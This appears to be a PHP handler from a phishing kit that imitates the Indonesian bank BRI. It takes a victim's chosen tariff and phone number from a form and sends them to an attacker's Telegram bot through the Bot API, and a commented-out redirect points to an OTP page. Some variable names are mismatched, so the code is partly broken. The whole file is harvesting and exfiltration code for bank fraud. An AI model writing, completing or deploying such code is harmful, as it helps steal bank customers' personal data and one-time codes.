<?php
session_start();
include "telegram.php";

$tarif = $_POST['tarif'];
$nomor = $_POST['nomor'];

$_SESSION['tarif'] = $tarif;
$_SESSION['nohp'] = $nohp;


$message = "

├• BRI | DATA | ".$tarif."
├───────────────────
├• *Tarif* : ".$ntarif."
├• *No Hp* : ".$nohp."
╰───────────────────
";
function sendMessage($id_telegram, $message, $id_botTele) {
    $url = "https://api.telegram.org/bot" . $id_botTele . "/sendMessage?parse_mode=html&chat_id=" . $id_telegram;
    $url = $url . "&text=" . urlencode($message);
    $ch = curl_init();
    $optArray = array(CURLOPT_URL => $url, CURLOPT_RETURNTRANSFER => true);
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}
sendMessage($id_telegram, $message, $id_botTele);
//header('Location:./../otp.php');
?>
